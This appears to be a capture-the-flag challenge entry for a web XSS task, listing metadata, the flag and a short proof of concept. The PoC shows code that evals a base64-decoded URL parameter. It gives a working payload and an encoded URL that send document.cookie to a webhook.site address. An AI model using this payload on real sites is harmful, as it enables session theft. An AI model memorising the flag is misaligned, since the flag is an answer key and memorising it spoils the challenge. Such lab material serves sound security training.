# Challenge Name:
cross-site

## Description:
basic vuln that can be so many $$$ in bounties

## Category:
Web

## File:
./dist.zip

## Flag:
`STORM{easy_xss_with_encoded_payload_00fe4bacb1dd}`

## Points:
500

## Author:
k.eii

## PoC
```
    if (url.searchParams.has("key")) {
        let key = url.searchParams.get("key");

        try {
            key = atob(key);
            if (key.includes("run")) {
                eval(key.replace("run", ""));
```
eval key param (base64 encoded needed because of atob)

payload:
`run(fetch('https://webhook.site/b25e1e98-59b2-493d-8c47-90b97d9aa25f?' + document.cookie));`

`http://proxy/?key=cnVuKGZldGNoKCdodHRwczovL3dlYmhvb2suc2l0ZS9iMjVlMWU5OC01OWIyLTQ5M2QtOGM0Ny05MGI5N2Q5YWEyNWY/JyArIGRvY3VtZW50LmNvb2tpZSkpOw==`
